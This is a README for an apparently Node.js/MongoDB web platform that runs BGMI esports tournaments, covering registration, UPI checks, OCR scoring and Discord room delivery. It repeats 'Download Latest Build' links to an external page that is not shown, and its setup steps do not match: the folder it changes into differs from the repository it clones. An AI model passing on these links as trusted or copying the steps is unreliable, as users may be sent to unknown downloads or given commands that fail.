# BGMI Esports Tournament Platform - Esports Tournament Management 2026

> **A browser-based BGMI esports operations system for handling team sign-ups, UPI payment checks, match scoring, and live tournament coordination.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mfournier1992/bgmi-esports-tournament-hub?style=flat-square)](https://github.com/mfournier1992/bgmi-esports-tournament-hub)

---

<p align="center">
  <a href="https://mfournier1992.github.io/bgmi-esports-tournament-hub/">
    <img src="https://img.shields.io/badge/Download-BGMI%20Esports%20Tournament%20Platform%20Latest-brightgreen?style=for-the-badge" alt="Download BGMI Esports Tournament Platform">
  </a>
</p>

> **[Download BGMI Esports Tournament Platform](https://mfournier1992.github.io/bgmi-esports-tournament-hub/)**

---

[Download Latest Build](https://mfournier1992.github.io/bgmi-esports-tournament-hub/)

---

## Platform Overview

BGMI Esports Tournament Platform is a full-stack application that brings the complete BGMI event lifecycle into one web interface. Tournament operators can publish events, configure dates and prize pools, allocate team slots, inspect payment references, and make current standings available to participants.

Alongside registration and event administration, the system includes BGMI player-statistics searches, OCR extraction from match scorecards, Discord-based delivery of custom room details, and a JWT-secured organizer dashboard. The application is built around Node.js, Express, MongoDB, and Tailwind CSS to support tournament administration in a structured workflow.

---

## Core Capabilities

- Reserve tournament positions as squads complete registration
- Check UPI submissions through 12-digit UTR validation
- Display current tournament standings with live leaderboards
- Retrieve BGMI player statistics
- Read match scorecard points through OCR processing
- Deliver custom room credentials through Discord
- Restrict organizer tools with JWT authentication
- Maintain anti-cheat blacklists and blocked BGMI UIDs
- Define tournament dates, schedules, prize pools, and event settings

---

## Getting Started

Download the source and move into the project folder:

```bash
git clone https://github.com/mfournier1992/bgmi-esports-tournament-hub.git
cd bgmi-tournament-platform
```

Install the required packages with npm:

```bash
npm install
```

After adding the necessary environment settings, run the development server:

```bash
npm run dev
```

To launch through the production-oriented script, run:

```bash
npm start
```

Script names may vary by repository configuration. Check `package.json` if the expected command is unavailable.

---

## Organizer Workflow

The following sequence represents a common tournament setup and operating process:

1. Launch the Node.js service and access its web interface.
2. Define the tournament schedule, prize pool, and number of available slots.
3. Open squad registration and allow teams to claim positions.
4. Inspect submitted UPI payment references and verify each 12-digit UTR.
5. Use the organizer portal to follow registrations and current standings.
6. Distribute BGMI custom room details through the configured Discord connection.
7. Run scorecards through OCR and apply the resulting match points.
8. Check player data, anti-cheat records, blacklist items, and banned BGMI UIDs when required.
9. Make the live leaderboard available or use it to track participant results.

---

## Environment Setup

Deployment-specific configuration should be placed in an environment file such as `.env`. Variable names must correspond to those expected by the application's configuration and integration code.

```env
NODE_ENV=development
PORT=3000
MONGODB_URI=mongodb://127.0.0.1:27017/bgmi-tournament
JWT_SECRET=replace-with-a-local-secret
DISCORD_BOT_TOKEN=replace-with-discord-token
```

Do not commit MongoDB credentials, JWT signing secrets, or Discord access credentials to the repository. OCR and payment settings should be configured according to the implementation shipped with the project.

---

## System Requirements

- Node.js runtime
- MongoDB database
- Current web browser
- Network connectivity for web integrations
- Discord credentials for custom room credential delivery
- Enough storage and processing resources for scorecard uploads and OCR operations

The interface uses Tailwind CSS, and the server layer runs on Node.js with Express.

---

## Frequently Asked Questions

### What type of users need this platform?

The application is designed for BGMI tournament organizers who need to manage teams, schedules, payments, score processing, and rankings.

### How does UPI verification work?

Submitted payment references are checked using 12-digit UTR validation.

### Where can event details be changed?

Organizers manage schedules, prize pools, registration capacity, and other tournament controls from the administration portal.

### Are rankings updated live?

Yes. As match results are processed, the platform can show standings through live leaderboards.

### What can cause startup failures?

Verify that Node.js and MongoDB are installed and available, run `npm install`, provide the required environment values, and ensure the configured port is free.

### How do I receive newer versions?

Use the latest build from the repository or pull the newest project source. If package definitions have changed, install dependencies again afterward.

### Is Discord delivery available without setup?

No. Custom room credential delivery through Discord depends on the required integration configuration and valid credentials.

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license terms.
